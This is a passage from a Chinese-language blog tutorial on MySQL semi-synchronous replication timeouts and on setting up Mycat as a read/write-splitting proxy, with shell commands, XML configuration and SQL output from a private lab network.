title="3.测试10s的延迟，如果过了10s没有slave响应，则返回成功"></a>3.测试10s的延迟，如果过了10s没有slave响应，则返回成功</h3><p>可以修改全局变量超时时间，单位是ms毫秒</p><p>停掉两个slave的同步看看</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs sql">stop slave;<br><br>[hellodb]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">select</span> @<span class="hljs-variable">@rpl</span>_semi_sync_master_timeout;<br><span class="hljs-operator">+</span><span class="hljs-comment">--------------------------------+</span><br><span class="hljs-operator">|</span> @<span class="hljs-variable">@rpl</span>_semi_sync_master_timeout <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">--------------------------------+</span><br><span class="hljs-operator">|</span>                          <span class="hljs-number">10000</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">--------------------------------+</span><br><br>##修改全局变量<br><span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> rpl_semi_sync_master_timeout<span class="hljs-operator">=</span><span class="hljs-number">2000</span>;<br>Query OK, <span class="hljs-number">0</span> <span class="hljs-keyword">rows</span> affected (<span class="hljs-number">0.00</span> sec)<br><br>##无slave响应，需要<span class="hljs-number">10</span>s返回成功，timeout值可以设置<br>[hellodb]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> teachers(name,age,gender) <span class="hljs-keyword">values</span>(<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-number">22</span>,<span class="hljs-string">&#x27;M&#x27;</span>);<br>Query OK, <span class="hljs-number">1</span> <span class="hljs-type">row</span> affected (<span class="hljs-number">10.00</span> sec)<br><br>##有slave响应，秒回，证明半同步复制是成功的<br><span class="hljs-keyword">start</span> slave;<br>[hellodb]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> teachers(name,age,gender) <span class="hljs-keyword">values</span>(<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-number">22</span>,<span class="hljs-string">&#x27;M&#x27;</span>);<br>Query OK, <span class="hljs-number">1</span> <span class="hljs-type">row</span> affected (<span class="hljs-number">0.02</span> sec)<br><br>##MySQL默认配置，在同步后才提交<br>[hellodb]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">show</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;Rpl_semi_sync_master_wait_point&#x27;</span>;<br><span class="hljs-operator">+</span><span class="hljs-comment">---------------------------------+------------+</span><br><span class="hljs-operator">|</span> Variable_name                   <span class="hljs-operator">|</span> <span class="hljs-keyword">Value</span>      <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">---------------------------------+------------+</span><br><span class="hljs-operator">|</span> rpl_semi_sync_master_wait_point <span class="hljs-operator">|</span> AFTER_SYNC <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">---------------------------------+------------+</span><br></code></pre></td></tr></table></figure><h1 id="5-用mycat实现mysql的读写分离"><a href="#5-用mycat实现mysql的读写分离" class="headerlink" title="5.用mycat实现mysql的读写分离"></a>5.用mycat实现mysql的读写分离</h1><h1 id="5-mycat：数据库proxy的实现"><a href="#5-mycat：数据库proxy的实现" class="headerlink" title="5.mycat：数据库proxy的实现"></a>5.mycat：数据库proxy的实现</h1><p>proxy服务器：用于写好逻辑，如果写请求，就到主节点；如果是读请求，就到从节点(更新机、查询机等)</p><p>垂直拆分：分库分表，关系不大的表可以拆分，如果是例如stu表和teacher表的话，那就是不太方便的；分库的话，可以和开发协商好；根据不同的业务类型进行拆分</p><p>水平拆分，放在不同的服务器中，以便解放性能瓶颈，或者读写分离等</p><p>—&gt;通过proxy代理来区分数据需要放在什么节点上，proxy代理节点也要冗余双节点，以免出现单点故障的问题</p><p>主要功能：实现一个MySQL代理proxy的功能，通过proxy与后端多个MySQL服务器相连，实现大规模的MySQL服务器集群功能</p><p>mycat核心协议：JDBC，与多个主流数据库相连，mycat是对数据库层面的抽象</p><p>工作原理：前端（HA-proxy）负载均衡—mycat proxy代理集群（冗余节点）—转发请求到后端1-N个MySQL服务器节点（冗余节点），类似K8s集群中，我们需要两个nginx节点做转发一样，万一一个pod挂了，还有另一个nginx pod作为转发请求</p><p>mycat实现读写分离：</p><p>1.接收写操作请求：转发到后端主节点，更新机</p><p>2.接收读请求：转发到后端查询机，读节点</p><p><img src="2792175-20221007225926257-2039702163.png" alt="img"></p><h2 id="mycat实现读写分离"><a href="#mycat实现读写分离" class="headerlink" title="mycat实现读写分离"></a>mycat实现读写分离</h2><p><img src="2792175-20221007225926558-1744303567.png" alt="img"></p><p>环境：客户端ubuntu 10.0.0.131</p><p>mycat节点：10.0.0.130</p><p>主节点：10.0.0.132</p><p>从节点：10.0.0.128</p><h2 id="1-下载包，解压缩到指定目录，配置执行的环境变量，这个可用于其他的服务，例如nginx编译安装"><a href="#1-下载包，解压缩到指定目录，配置执行的环境变量，这个可用于其他的服务，例如nginx编译安装" class="headerlink" title="1.下载包，解压缩到指定目录，配置执行的环境变量，这个可用于其他的服务，例如nginx编译安装"></a>1.下载包，解压缩到指定目录，配置执行的环境变量，这个可用于其他的服务，例如nginx编译安装</h2><p>适用于所有编译安装的服务，可以将路径写到环境变量里面去，就不用人为进入到bin目录下了，类似tomcat也一样的，nginx等很多服务</p><p>需要先下载mycat的包</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">tar xf Mycat-server-1.6.7.4-release-20200105164103-linux.tar.gz -C /mycat<br><br><span class="hljs-comment">##查看包内的内容，已经编译好的东西，可以直接使用</span><br>tar -tvf Mycat-server-1.6.7.4-release-20200105164103-linux.tar.gz<br>bin  catlet  conf  lib  logs  version.txt<br><br><span class="hljs-comment">##修改执行文件的path路径，让他能够直接执行，不需要加上执行文件路径，类似nginx的路径</span><br>原路径：/apps/mycat/bin/mycat<br><br>vim /etc/profile.d/mycat.sh，让系统执行mycat指令的时候，直接去调用环境变量的PATH<br>PATH=/apps/mycat/bin:<span class="hljs-variable">$PATH</span><br><span class="hljs-comment">##让环境变量生效</span><br>. /etc/profile.d/mycat.sh / <span class="hljs-built_in">source</span> /etc/profile.d/mycat.sh<br><br>mycat<br>Usage: /apps/mycat/bin/mycat &#123; console | start | stop | restart | status | dump &#125;<br></code></pre></td></tr></table></figure><h2 id="2-安装java编译环境，修改mycat默认端口"><a href="#2-安装java编译环境，修改mycat默认端口" class="headerlink" title="2.安装java编译环境，修改mycat默认端口"></a>2.安装java编译环境，修改mycat默认端口</h2><p>升配一下mycat节点的内存，java进程比较吃内存</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">yum -y install java<br><br><span class="hljs-comment">##java 8版本</span><br>java -version<br>openjdk version <span class="hljs-string">&quot;1.8.0_342&quot;</span><br>OpenJDK Runtime Environment (build 1.8.0_342-b07)<br>OpenJDK 64-Bit Server VM (build 25.342-b07, mixed mode)<br></code></pre></td></tr></table></figure><p>启动mycat，监听的是8066和9066两个端口，对外暴露的，默认两个对外端口，可以修改的</p><p>对外暴露的端口默认是3306的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">mycat start<br>ss -ntl | grep 8066<br>LISTEN     0      100         :::8066                    :::*<br><br><span class="hljs-comment">##ss -ntlp：表示显示是哪个进程协议服务占用了这个端口，仅显示TCP连接，显示users，这个端口的进程</span><br>netstat -ntlp<br>[11:15:41 root@proxy ~]<span class="hljs-comment">#ss -ntlp | grep 8066</span><br>LISTEN     0      100         :::8066                    :::*                   <span class="hljs-built_in">users</span>:((<span class="hljs-string">&quot;java&quot;</span>,pid=11766,fd=86))<br>[11:15:51 root@proxy ~]<span class="hljs-comment">#ss -ntlp | grep 9066</span><br>LISTEN     0      100         :::9066                    :::*                   <span class="hljs-built_in">users</span>:((<span class="hljs-string">&quot;java&quot;</span>,pid=11766,fd=82))<br><br><span class="hljs-comment">##查看mycat的日志，/logs/wrapper.log</span><br>[11:18:26 root@proxy logs]<span class="hljs-comment">#tail -f wrapper.log </span><br>STATUS | wrapper  | 2022/09/17 11:14:07 | --&gt; Wrapper Started as Daemon<br>STATUS | wrapper  | 2022/09/17 11:14:07 | Launching a JVM...<br>INFO   | jvm 1    | 2022/09/17 11:14:08 | Wrapper (Version 3.2.3) http://wrapper.tanukisoftware.org<br>INFO   | jvm 1    | 2022/09/17 11:14:08 |   Copyright 1999-2006 Tanuki Software, Inc.  All Rights Reserved.<br>INFO   | jvm 1    | 2022/09/17 11:14:08 | <br>INFO   | jvm 1    | 2022/09/17 11:14:09 | MyCAT Server startup successfully. see logs <span class="hljs-keyword">in</span> logs/mycat.log<br></code></pre></td></tr></table></figure><p>修改mycat端口，默认这一段是注释掉的，需要复制新的，并且修改默认客户端端口号；对外暴露端口：3306，管理端口：9066</p><p>mycat默认连接用户：root，默认密码：123456，修改为123</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs xml">/conf/server.xml<br>/serverport，/user<br><span class="hljs-comment">&lt;!--&lt;property name=&quot;serverPort&quot;&gt;8066&lt;/property&gt; &lt;property name=&quot;managerPort&quot;&gt;9066&lt;/property&gt; --&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;serverPort&quot;</span>&gt;</span>3306<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;managerPort&quot;</span>&gt;</span>9066<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span> <br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">user</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;root&quot;</span> <span class="hljs-attr">defaultAccount</span>=<span class="hljs-string">&quot;true&quot;</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password&quot;</span>&gt;</span>123<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;schemas&quot;</span>&gt;</span>TESTDB<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;defaultSchema&quot;</span>&gt;</span>TESTDB<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="3-在后端MySQL上创建mycat连接用户"><a href="#3-在后端MySQL上创建mycat连接用户" class="headerlink" title="3.在后端MySQL上创建mycat连接用户"></a>3.在后端MySQL上创建mycat连接用户</h2><p>授权给到hellodb库的权限，读写权限，因为访问到proxy可以进行这个库的读写分离，mycat用户可以操作这个库，也可以操作所有的库</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sql">[hellodb]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">create</span> <span class="hljs-keyword">user</span> mycat@<span class="hljs-string">&#x27;%&#x27;</span> identified <span class="hljs-keyword">by</span> <span class="hljs-string">&#x27;123&#x27;</span>;<br>Query OK, <span class="hljs-number">0</span> <span class="hljs-keyword">rows</span> affected (<span class="hljs-number">0.01</span> sec)<br><br>[hellodb]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">grant</span> <span class="hljs-keyword">all</span> <span class="hljs-keyword">on</span> hellodb.<span class="hljs-operator">*</span> <span class="hljs-keyword">to</span> mycat@<span class="hljs-string">&#x27;%&#x27;</span>;<br>Query OK, <span class="hljs-number">0</span> <span class="hljs-keyword">rows</span> affected (<span class="hljs-number">0.00</span> sec)<br><br>[hellodb]<span class="hljs-operator">&gt;</span>flush privileges;<br>Query OK, <span class="hljs-number">0</span> <span class="hljs-keyword">rows</span> affected (<span class="hljs-number">0.01</span> sec)<br></code></pre></td></tr></table></figure><h2 id="4-在schema-xml上实现读写分离的效果"><a href="#4-在schema-xml上实现读写分离的效果" class="headerlink" title="4.在schema.xml上实现读写分离的效果"></a>4.在schema.xml上实现读写分离的效果</h2><p>修改schema.xml文件，修改readhost和writehost，修改后短的节点</p><p>schema name：在mycat代理上显示给客户端看的DB名字</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs xml">/apps/mycat/conf/schema.xml<br><br><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">mycat</span>:schema <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;schema.dtd&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">mycat:schema</span> <span class="hljs-attr">xmlns:mycat</span>=<span class="hljs-string">&quot;http://io.mycat/&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">schema</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;TESTDB&quot;</span> <span class="hljs-attr">checkSQLschema</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">sqlMaxLimit</span>=<span class="hljs-string">&quot;100&quot;</span> <span class="hljs-attr">dataNode</span>=<span class="hljs-string">&quot;dn1&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">schema</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dataNode</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;dn1&quot;</span> <span class="hljs-attr">dataHost</span>=<span class="hljs-string">&quot;localhost1&quot;</span> <span class="hljs-attr">database</span>=<span class="hljs-string">&quot;hellodb&quot;</span> /&gt;</span> <span class="hljs-comment">&lt;!-- 后端DB名字 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dataHost</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;localhost1&quot;</span> <span class="hljs-attr">maxCon</span>=<span class="hljs-string">&quot;1000&quot;</span> <span class="hljs-attr">minCon</span>=<span class="hljs-string">&quot;10&quot;</span> <span class="hljs-attr">balance</span>=<span class="hljs-string">&quot;1&quot;</span></span><br><span class="hljs-tag">              <span class="hljs-attr">writeType</span>=<span class="hljs-string">&quot;0&quot;</span> <span class="hljs-attr">dbType</span>=<span class="hljs-string">&quot;mysql&quot;</span> <span class="hljs-attr">dbDriver</span>=<span class="hljs-string">&quot;native&quot;</span> <span class="hljs-attr">switchType</span>=<span class="hljs-string">&quot;1&quot;</span>  <span class="hljs-attr">slaveThreshold</span>=<span class="hljs-string">&quot;100&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">heartbeat</span>&gt;</span>select user()<span class="hljs-tag">&lt;/<span class="hljs-name">heartbeat</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">writeHost</span> <span class="hljs-attr">host</span>=<span class="hljs-string">&quot;host1&quot;</span> <span class="hljs-attr">url</span>=<span class="hljs-string">&quot;10.0.0.132:3306&quot;</span> <span class="hljs-attr">user</span>=<span class="hljs-string">&quot;mycat&quot;</span> <span class="hljs-attr">password</span>=<span class="hljs-string">&quot;123&quot;</span>&gt;</span> <span class="hljs-comment">&lt;!-- 后端DB1的IP --&gt;</span><br>         <span class="hljs-tag">&lt;<span class="hljs-name">readHost</span> <span class="hljs-attr">host</span>=<span class="hljs-string">&quot;host2&quot;</span> <span class="hljs-attr">url</span>=<span class="hljs-string">&quot;10.0.0.128:3306&quot;</span> <span class="hljs-attr">user</span>=<span class="hljs-string">&quot;mycat&quot;</span> <span class="hljs-attr">password</span>=<span class="hljs-string">&quot;123&quot;</span> /&gt;</span> <span class="hljs-comment">&lt;!-- 后端DB2的IP --&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">writeHost</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dataHost</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">mycat:schema</span>&gt;</span><br></code></pre></td></tr></table></figure><p>验证修改server和schema后的结果</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##重启服务</span><br>mycat restart<br><br><span class="hljs-comment">##查看日志，jvm1，证明是java编译的东西</span><br><span class="hljs-built_in">tail</span> -f /apps/mycat/logs/wrappers.log<br>INFO   | jvm 1    | 2022/09/17 14:15:46 | MyCAT Server startup successfully. see logs <span class="hljs-keyword">in</span> logs/mycat.log<br><br><span class="hljs-comment">##查看机器的监听端口是不是修改成3306了</span><br>ss -ntlp | grep 3306<br>LISTEN     0      100         :::3306                    :::*                   <span class="hljs-built_in">users</span>:((<span class="hljs-string">&quot;java&quot;</span>,pid=50461,fd=86))<br><br><span class="hljs-comment">##客户端连接到mycat代理，随便找个网络通的，查询发现就是hellodb的内容，可直接进行读写操作</span><br>mysql -uroot -p123 -h 10.0.0.130<br>mysql&gt; show databases;;<br>+----------+<br>| DATABASE |<br>+----------+<br>| TESTDB   |<br>+----------+<br>1 row <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.00 sec)<br><br>mysql&gt; show tables;<br>+-------------------+<br>| Tables_in_hellodb |<br>+-------------------+<br>| classes           |<br>| coc               |<br>| courses           |<br>| scores            |<br>| stu               |<br>| teachers          |<br>| testlog           |<br>| toc               |<br>+-------------------+<br>8 rows <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.01 sec)<br></code></pre></td></tr></table></figure><h2 id="5-验证mycat读写分离到server1和2的效果，使用general-log通用日志实现"><a href="#5-验证mycat读写分离到server1和2的效果，使用general-log通用日志实现" class="headerlink" title="5.验证mycat读写分离到server1和2的效果，使用general_log通用日志实现"></a>5.验证mycat读写分离到server1和2的效果，使用general_log通用日志实现</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs sql">##开启server1和server2的general_log日志<br>[hellodb]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">select</span> @<span class="hljs-variable">@general</span>_log;<br><span class="hljs-operator">+</span><span class="hljs-comment">---------------+</span><br><span class="hljs-operator">|</span> @<span class="hljs-variable">@general</span>_log <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">---------------+</span><br><span class="hljs-operator">|</span>             <span class="hljs-number">0</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">---------------+</span><br><br><span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> general_log<span class="hljs-operator">=</span><span class="hljs-number">1</span>;<br><span class="hljs-keyword">show</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%general_log%&#x27;</span>;<br><br>[hellodb]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">show</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%general_log%&#x27;</span>;<br><span class="hljs-operator">+</span><span class="hljs-comment">------------------+-----------------------+</span><br><span class="hljs-operator">|</span> Variable_name    <span class="hljs-operator">|</span> <span class="hljs-keyword">Value</span>                 <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">------------------+-----------------------+</span><br><span class="hljs-operator">|</span> general_log      <span class="hljs-operator">|</span> <span class="hljs-keyword">ON</span>                    <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> general_log_file <span class="hljs-operator">|</span> <span class="hljs-operator">/</span>data<span class="hljs-operator">/</span>mysql<span class="hljs-operator">/</span>rocky.log <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">------------------+-----------------------+</span><br><br>[(<span class="hljs-keyword">none</span>)]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">show</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%general_log%&#x27;</span>;<br><span class="hljs-operator">+</span><span class="hljs-comment">------------------+------------------------+</span><br><span class="hljs-operator">|</span> Variable_name    <span class="hljs-operator">|</span> <span class="hljs-keyword">Value</span>                  <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">------------------+------------------------+</span><br><span class="hljs-operator">|</span> general_log      <span class="hljs-operator">|</span> <span class="hljs-keyword">ON</span>                     <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> general_log_file <span class="hljs-operator">|</span> <span class="hljs-operator">/</span>data<span class="hljs-operator">/</span>mysql<span class="hljs-operator">/</span>master.log <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">------------------+------------------------+</span><br><br>bash上开启<br>tail <span class="hljs-operator">-</span>f <span class="hljs-operator">/</span>data<span class="hljs-operator">/</span>mysql<span class="hljs-operator">/</span>rocky.log<br>tail <span class="hljs-operator">-</span>f <span class="hljs-operator">/</span>data<span class="hljs-operator">/</span>mysql<span class="hljs-operator">/</span>master.log<br><br>由ubuntu客户端向mycat进行写入<br><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> teachers(name,age,gender) <span class="hljs-keyword">values</span>(<span class="hljs-string">&#x27;mycat&#x27;</span>,<span class="hljs-number">11</span>,<span class="hljs-string">&#x27;M&#x27;</span>);<br><br>##位于<span class="hljs-number">132</span>主节点，日志有记录，从节点上只有一个同步的事务记录下来了<br><span class="hljs-number">2022</span><span class="hljs-number">-09</span><span class="hljs-number">-17</span>T06:<span class="hljs-number">40</span>:<span class="hljs-number">37.211746</span>Z  <span class="hljs-number">112</span> Query<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> teachers(name,age,gender) <span class="hljs-keyword">values</span>(<span class="hljs-string">&#x27;mycat&#x27;</span>,<span class="hljs-number">11</span>,<span class="hljs-string">&#x27;M&#x27;</span>)<br><br><span class="hljs-number">2022</span><span class="hljs-number">-09</span><span class="hljs-number">-17</span>T06:<span class="hljs-number">40</span>:<span class="hljs-number">37.215598</span>Z    <span class="hljs-number">7</span> Query<span class="hljs-keyword">BEGIN</span><br><span class="hljs-number">2022</span><span class="hljs-number">-09</span><span class="hljs-number">-17</span>T06:<span class="hljs-number">40</span>:<span class="hljs-number">37.216535</span>Z    <span class="hljs-number">7</span> Query<span class="hljs-keyword">COMMIT</span> <span class="hljs-comment">/* implicit, from Xid_log_event */</span><br><br>##查询一下查询的操作，是哪个server，看server id，查询的是<span class="hljs-number">128</span>从节点<br><span class="hljs-keyword">select</span> @<span class="hljs-variable">@server</span>_id;<br>mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> @<span class="hljs-variable">@server</span>_id;<br><span class="hljs-operator">+</span><span class="hljs-comment">-------------+</span><br><span class="hljs-operator">|</span> @<span class="hljs-variable">@server</span>_id <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">-------------+</span><br><span class="hljs-operator">|</span>         <span class="hljs-number">128</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">-------------+</span><br><br>##更新操作试试，已经修改为serverid，正是<span class="hljs-number">132</span>的id，证明读写分离是OK的<br>mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">update</span> teachers <span class="hljs-keyword">set</span> age<span class="hljs-operator">=</span>@<span class="hljs-variable">@server</span>_id <span class="hljs-keyword">where</span> tid<span class="hljs-operator">=</span><span class="hljs-number">13</span>;<br>Query OK, <span class="hljs-number">1</span> <span class="hljs-type">row</span> affected (<span class="hljs-number">0.01</span> sec)<br><br>mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span><span class="hljs-keyword">from</span> teachers <span class="hljs-keyword">where</span> tid<span class="hljs-operator">=</span><span class="hljs-number">13</span>;;<br><span class="hljs-operator">+</span><span class="hljs-comment">-----+-------+-----+--------+</span><br><span class="hljs-operator">|</span> TID <span class="hljs-operator">|</span> Name  <span class="hljs-operator">|</span> Age <span class="hljs-operator">|</span> Gender <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">-----+-------+-----+--------+</span><br><span class="hljs-operator">|</span>  <span class="hljs-number">13</span> <span class="hljs-operator">|</span> mycat <span class="hljs-operator">|</span> <span class="hljs-number">132</span> <span class="hljs-operator">|</span> M      <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">-----+-------+-----+--------+</span><br></code></pre></td></tr></table></figure><h2 id="heartbeat-select-user-用途"><a href="#heartbeat-select-user-用途" class="headerlink" title="heartbeat() select user()用途"></a>heartbeat() select user()用途</h2><p>用于后端MySQL服务器的心跳检测，mycat服务器周期性的向后端MySQL机器发送健康检查的指令，=select一下用户，如果又返回结果，则证明可以MySQL服务是存活的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">tail</span> -f /apps/mycat/logs/wrappers.log<br>2022-09-17T06:33:46.730245Z   20 Queryselect user()<br>2022-09-17T06:33:56.730453Z   16 Queryselect user()<br>2022-09-17T06:34:06.731198Z   18 Queryselect 